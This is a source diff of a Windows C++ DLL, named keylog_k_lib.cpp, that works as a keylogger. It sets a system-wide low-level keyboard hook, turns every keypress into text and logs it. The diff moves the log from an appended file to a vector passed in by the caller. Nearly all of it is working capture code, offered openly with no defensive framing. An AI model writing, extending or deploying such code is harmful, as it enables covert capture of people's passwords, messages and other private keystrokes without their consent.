@@ -1,40 +1,27 @@
 //cl /EHsc /LD .\keylog_k_lib.cpp /link User32.lib
 #include <Windows.h>
-#include <fstream>
 #include <mutex>
 #include <codecvt>
-#include <string.h>
+#include <string>
+#include <vector>
 #define DLL_EXPORT __declspec(dllexport)
 ///////////////////////////////////////////////////////////////////////
 HHOOK keyboardHook;
-
-std::ofstream outputFile;
+std::vector<std::string>* sharedLogVector = nullptr; // Pointer to the shared vector
 std::mutex logMutex;
 ///////////////////////////////////////////////////////////////////////
-
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-
 ///////////////////////////////////////////////////////////////////////
 
-DLL_EXPORT void Initialize(const std::string& filename)
+DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
-
-    {
-        std::lock_guard<std::mutex> lock(logMutex);
-        outputFile.open(filename, std::ios::app);
-    }
-
+    sharedLogVector = logVector;
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
 }
 
-DLL_EXPORT void Cleanup(const std::string& filename)
+DLL_EXPORT void Cleanup()
 {
     if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
-
-    {
-        std::lock_guard<std::mutex> lock(logMutex);
-        outputFile.close();
-    }
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -46,249 +33,166 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         GetKeyboardState(keyState);
         WCHAR outputChar[2] = { 0 };
 
-        switch (wParam) // Switch on wParam (message type)
         {
-            case WM_KEYDOWN:
-            case WM_SYSKEYDOWN: // Handle system key downs (Alt, etc.)
+            std::lock_guard<std::mutex> lock(logMutex);
+            switch (wParam) // Switch on wParam (message type)
             {
-                
-                switch (keyInfo->vkCode)
+                case WM_KEYDOWN:
+                case WM_SYSKEYDOWN:
                 {
-                    case VK_LSHIFT:
-                    case VK_RSHIFT:
-                        //std::wcout << L"[Shift Pressed] ";
-                        outputFile << "[Shift Pressed] ";
-                        outputFile.flush();
-                        break;
-                    case VK_LCONTROL:
-                    case VK_RCONTROL:
-                        //std::wcout << L"[Control]";
-                        outputFile << "[Control]";
-                        outputFile.flush();
-                        break;
-                    case VK_LMENU:
-                    case VK_RMENU:
-                        //std::wcout << L"[Alt] ";
-                        outputFile << "[Alt] ";
-                        outputFile.flush();
-                        break;
-                    case VK_CAPITAL:
-                        //std::wcout << L"[Caps Lock] ";
-                        outputFile << "[Caps Lock] ";
-                        outputFile.flush();
-                        break;
-                    case VK_BACK:
-                        //std::wcout << L"[Backspace]";
-                        outputFile << "[Backspace]";
-                        outputFile.flush();
-                        break;
-                    case VK_TAB:
-                        //std::wcout << L"[Tab] ";    
-                        outputFile << "[Tab] ";
-                        outputFile.flush();
-                        break;
-                    case VK_ESCAPE:
-                        //std::wcout << L"[Escape] ";
-                        outputFile << "[Escape] ";
-                        outputFile.flush();
-                        break;
-                    case VK_RETURN:
-                        //std::wcout << L"[Enter] ";
-                        outputFile << "[Enter] ";
-                        outputFile.flush();
-                        break;
-                    case VK_SPACE:
-                        //std::wcout << L"[Space]";
-                        outputFile << "[Space]";
-                        outputFile.flush();
-                        break;
-                    case VK_LEFT:
-                        //std::wcout << L"[<-] ";
-                        outputFile << "[<-] ";
-                        outputFile.flush();
-                        break;
-                    case VK_RIGHT:
-                        //std::wcout << L"[->] ";
-                        outputFile << "[->] ";
-                        outputFile.flush();
-                        break;
-                    case VK_UP:
-                        //std::wcout << L"[Up Arrow] ";
-                        outputFile << "[Up Arrow] ";
-                        outputFile.flush();
-                        break;
-                    case VK_DOWN:
-                        //std::wcout << L"[Down Arrow] ";
-                        outputFile << "[Down Arrow] ";
-                        outputFile.flush();
-                        break;
-                    case VK_DELETE:
-                        //std::wcout << L"[Del] ";
-                        outputFile << "[Del] ";
-                        outputFile.flush();
-                        break;
-                    case VK_INSERT:
-                        //std::wcout << L"[Ins] ";
-                        outputFile << "[Ins] ";
-                        outputFile.flush();
-                        break;
-                    case VK_LWIN:
-                    case VK_RWIN:
-                        //std::wcout << L"[Windows] ";
-                        outputFile << "[Windows] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD0:
-                        //std::wcout << L"[NumPad 0] ";
-                        outputFile << "[NumPad 0] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD1:
-                        //std::wcout << L"[NumPad 1] ";
-                        outputFile << "[NumPad 1] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD2:
-                        //std::wcout << L"[NumPad 2] ";
-                        outputFile << "[NumPad 2] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD3:
-                        //std::wcout << L"[NumPad 3] ";
-                        outputFile << "[NumPad 3] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD4:
-                        //std::wcout << L"[NumPad 4] ";
-                        outputFile << "[NumPad 4] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD5:
-                        //std::wcout << L"[NumPad 5] ";
-                        outputFile << "[NumPad 5] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD6:
-                        //std::wcout << L"[NumPad 6] ";
-                        outputFile << "[NumPad 6] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD7:
-                        //std::wcout << L"[NumPad 7] ";
-                        outputFile << "[NumPad 7] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD8:
-                        //std::wcout << L"[NumPad 8] ";
-                        outputFile << "[NumPad 8] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMPAD9:
-                        //std::wcout << L"[NumPad 9] ";
-                        outputFile << "[NumPad 9] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_MULTIPLY:
-                        //std::wcout << L"[NumPad Multiply] ";
-                        outputFile << "[NumPad Multiply] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_ADD:
-                        //std::wcout << L"[NumPad Add] ";
-                        outputFile << "[NumPad Add] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_SEPARATOR:
-                        //std::wcout << L"[NumPad Separator] ";
-                        outputFile << "[NumPad Separator] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_SUBTRACT:
-                        //std::wcout << L"[NumPad Subtract] ";
-                        outputFile << "[NumPad Subtract] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_DECIMAL:
-                        //std::wcout << L"[NumPad Decimal] ";
-                        outputFile << "[NumPad Decimal] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_DIVIDE:
-                        //std::wcout << L"[NumPad Divide] ";
-                        outputFile << "[NumPad Divide] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_HOME:
-                        //std::wcout << L"[Home] ";
-                        outputFile << "[Home] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_END:
-                        //std::wcout << L"[End] ";
-                        outputFile << "[End] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_PRIOR:
-                        //std::wcout << L"[Pg_up] ";
-                        outputFile << "[Pg_up] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NEXT:
-                        //std::wcout << L"[Pg_down] ";
-                        outputFile << "[Pg_down] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_NUMLOCK:
-                        //std::wcout << L"[Numlock] ";
-                        outputFile << "[Numlock] "; 
-                        outputFile.flush();
-                        break;
-                    case VK_SNAPSHOT:
-                        //std::wcout << L"[Print_scr] ";
-                        outputFile << "[Print_scr] "; 
-                        outputFile.flush();
-                        break;
-                    default:
+                    switch (keyInfo->vkCode)
                     {
-                        int result = ToUnicode(keyInfo->vkCode, keyInfo->scanCode, keyState, outputChar, 1, 0);
-                        if (result == 1) {
-                            //std::wcout << outputChar[0] << L" "; 
-
-                            // Convert wchar_t to UTF-8
-                            std::string utf8Char(1, (char)outputChar[0]); 
-                            outputFile << utf8Char; 
-                        } else if (result > 1) { 
-                            outputChar[result] = L'\0';
-                            //std::wcout << outputChar << L" "; 
-
-                            // Convert wchar_t string to UTF-8
-                            std::string utf8Char = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(outputChar);
-                            outputFile << utf8Char; 
-                        } else {
-                            //std::wcout << L"[unknown] ";
-                            outputFile << "[unknown] "; 
+                        case VK_LSHIFT:
+                        case VK_RSHIFT:
+                            sharedLogVector->emplace_back("[Shift Pressed] ");
+                            break;
+                        case VK_LCONTROL:
+                        case VK_RCONTROL:
+                            sharedLogVector->emplace_back("[Control]");
+                            break;
+                        case VK_LMENU:
+                        case VK_RMENU:
+                            sharedLogVector->emplace_back("[Alt] ");
+                            break;
+                        case VK_CAPITAL:
+                            sharedLogVector->emplace_back("[Caps Lock] ");
+                            break;
+                        case VK_BACK:
+                            sharedLogVector->emplace_back("[Backspace]");
+                            break;
+                        case VK_TAB:
+                            sharedLogVector->emplace_back("[Tab] ");
+                            break;
+                        case VK_ESCAPE:
+                            sharedLogVector->emplace_back("[Escape] ");
+                            break;
+                        case VK_RETURN:
+                            sharedLogVector->emplace_back("[Enter] ");
+                            break;
+                        case VK_SPACE:
+                            sharedLogVector->emplace_back("[Space]");
+                            break;
+                        case VK_LEFT:
+                            sharedLogVector->emplace_back("[<-] ");
+                            break;
+                        case VK_RIGHT:
+                            sharedLogVector->emplace_back("[->] ");
+                            break;
+                        case VK_UP:
+                            sharedLogVector->emplace_back("[Up Arrow] ");
+                            break;
+                        case VK_DOWN:
+                            sharedLogVector->emplace_back("[Down Arrow] ");
+                            break;
+                        case VK_DELETE:
+                            sharedLogVector->emplace_back("[Del] ");
+                            break;
+                        case VK_INSERT:
+                            sharedLogVector->emplace_back("[Ins] ");
+                            break;
+                        case VK_LWIN:
+                        case VK_RWIN:
+                            sharedLogVector->emplace_back("[Windows] ");
+                            break;
+                        case VK_NUMPAD0:
+                            sharedLogVector->emplace_back("[NumPad 0] ");
+                            break;
+                        case VK_NUMPAD1:
+                            sharedLogVector->emplace_back("[NumPad 1] ");
+                            break;
+                        case VK_NUMPAD2:
+                            sharedLogVector->emplace_back("[NumPad 2] ");
+                            break;
+                        case VK_NUMPAD3:
+                            sharedLogVector->emplace_back("[NumPad 3] ");
+                            break;
+                        case VK_NUMPAD4:
+                            sharedLogVector->emplace_back("[NumPad 4] ");
+                            break;
+                        case VK_NUMPAD5:
+                            sharedLogVector->emplace_back("[NumPad 5] ");
+                            break;
+                        case VK_NUMPAD6:
+                            sharedLogVector->emplace_back("[NumPad 6] ");
+                            break;
+                        case VK_NUMPAD7:
+                            sharedLogVector->emplace_back("[NumPad 7] ");
+                            break;
+                        case VK_NUMPAD8:
+                            sharedLogVector->emplace_back("[NumPad 8] ");
+                            break;
+                        case VK_NUMPAD9:
+                            sharedLogVector->emplace_back("[NumPad 9] ");
+                            break;
+                        case VK_MULTIPLY:
+                            sharedLogVector->emplace_back("[NumPad Multiply] ");
+                            break;
+                        case VK_ADD:
+                            sharedLogVector->emplace_back("[NumPad Add] ");
+                            break;
+                        case VK_SEPARATOR:
+                            sharedLogVector->emplace_back("[NumPad Separator] ");
+                            break;
+                        case VK_SUBTRACT:
+                            sharedLogVector->emplace_back("[NumPad Subtract] ");
+                            break;
+                        case VK_DECIMAL:
+                            sharedLogVector->emplace_back("[NumPad Decimal] ");
+                            break;
+                        case VK_DIVIDE:
+                            sharedLogVector->emplace_back("[NumPad Divide] ");
+                            break;
+                        case VK_HOME:
+                            sharedLogVector->emplace_back("[Home] ");
+                            break;
+                        case VK_END:
+                            sharedLogVector->emplace_back("[End] ");
+                            break;
+                        case VK_PRIOR:
+                            sharedLogVector->emplace_back("[Pg_up] ");
+                            break;
+                        case VK_NEXT:
+                            sharedLogVector->emplace_back("[Pg_down] ");
+                            break;
+                        case VK_NUMLOCK:
+                            sharedLogVector->emplace_back("[Numlock] ");
+                            break;
+                        case VK_SNAPSHOT:
+                            sharedLogVector->emplace_back("[Print_scr] ");
+                            break;
+                        default:
+                        {
+                            int result = ToUnicode(keyInfo->vkCode, keyInfo->scanCode, keyState, outputChar, 1, 0);
+                            if (result == 1)
+                            {
+                                std::string utf8Char(1, (char)outputChar[0]); 
+                                sharedLogVector->emplace_back(utf8Char);
+                            } else if (result > 1) { 
+                                outputChar[result] = L'\0';
+                                std::string utf8Char = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(outputChar);
+                                sharedLogVector->emplace_back(utf8Char);
+                            } 
+                            else sharedLogVector->emplace_back("[unknown] ");
+                            
+                            break;
                         }
-                        outputFile.flush(); 
-                        break;
                     }
+                    break;
                 }
-                break;
-            }
-            case WM_KEYUP:
-            case WM_SYSKEYUP: // Handle system key ups
-            {   
-                switch (keyInfo->vkCode)
-                {
-                    case VK_LSHIFT:
-                    case VK_RSHIFT:
+                case WM_KEYUP:
+                case WM_SYSKEYUP: // Handle system key ups
+                {   
+                    switch (keyInfo->vkCode)
                     {
-                        //std::wcout << L"[Shift Released] ";
-                        outputFile << "[Shift Released] ";
-                        outputFile.flush();
-                        break;
+                        case VK_LSHIFT:
+                        case VK_RSHIFT:
+                        {
+                            sharedLogVector->emplace_back("[Shift Released] ");
+                            break;
+                        }
                     }
+                    break;
                 }
-                break;
             }
         }
     }
